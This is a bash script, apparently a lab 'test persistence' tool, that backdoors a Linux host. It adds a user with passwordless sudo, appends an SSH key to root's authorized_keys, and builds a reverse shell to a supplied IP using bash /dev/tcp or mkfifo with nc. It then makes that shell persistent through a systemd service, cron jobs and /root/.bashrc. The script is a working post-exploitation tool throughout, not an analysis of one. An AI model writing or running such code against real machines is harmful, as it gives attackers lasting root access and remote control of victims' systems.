#!/bin/bash
# Test persistence by Kur0bai
# Usage: ./persistm3.sh USER PASSWORD IP PORT

set -euo pipefail

USER_NAME="${1:-}"
USER_PASS="${2:-}"
TARGET_IP="${3:-}"
TARGET_PORT="${4:-}"

echo "[*] Creating user with sudo..."
useradd -m "$USER_NAME" -s /bin/bash
echo "${USER_NAME}:${USER_PASS}" | chpasswd
echo "${USER_NAME} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Optional SSH key
echo "[*] Adding ssh key..."
if [ -f ./id_rsa.pub ]; then
    mkdir -p /root/.ssh
    cat ./id_rsa.pub >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
else
    echo "[!] You don't have the id_rsa.pub key, skipping..."
fi

# Check support for /dev/tcp in bash
bash_supports_dev_tcp() {
    bash -c "echo > /dev/tcp/127.0.0.1/65535" > /dev/null 2>&1 && return 0
    output="$(bash -c "echo > /dev/tcp/127.0.0.1/65535" 2>&1 || true)"
    if echo "$output" | grep -qE "Connection refused|No route to host|time out"; then
        return 0
    fi
    if echo "$output" | grep -q "No such file or directory"; then 
        return 1
    fi
    return 1
}

# Decide payload
PAYLOAD=""
if bash_supports_dev_tcp; then
    echo "[*] Bash supports /dev/tcp -> using native bash payload."
    PAYLOAD="bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1"
else 
    if command -v nc >/dev/null 2>&1; then
        echo "[*] No /dev/tcp, using mkfifo+nc payload."
        PAYLOAD="mkfifo /tmp/f; nc ${TARGET_IP} ${TARGET_PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"
    else
        echo "[*] No nc and no /dev/tcp -> can't set payload."
        PAYLOAD=""
    fi
fi

# Add persistence
if [[ -n "$PAYLOAD" ]]; then
    if command -v systemctl > /dev/null 2>&1; then
        echo "[*] Creating persistent service in systemd..."
        SERVICE_PATH="/etc/systemd/system/persist-lab.service"
        echo "[Unit]
Description=Labs Persistence 
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '${PAYLOAD}'
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target" > "$SERVICE_PATH"

        chmod 644 "$SERVICE_PATH"
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable persist-lab.service 2>/dev/null || true
        echo "[*] Service created at $SERVICE_PATH"
    else
        echo "[*] No systemd found, using cron and .bashrc"
        CRON_LINE="* * * * * ${PAYLOAD}"
        (crontab -l 2>/dev/null | grep -v -F "$PAYLOAD" || true; echo "$CRON_LINE") | crontab -

        if ! grep -Fq "$PAYLOAD" /root/.bashrc 2>/dev/null; then
            echo "${PAYLOAD}" >> /root/.bashrc
            echo "[*] Payload added to /root/.bashrc (triggers on shell open)"
        else
            echo "[*] Payload already in /root/.bashrc, skipping..."
        fi
    fi
else
    echo "[*] Couldn't configure the payload (missing nc and /dev/tcp) :'("
fi

echo "[*] Done. User: $USER_NAME, Pass: $USER_PASS"
echo "[*] Listen with: nc -lvnp ${TARGET_PORT}"
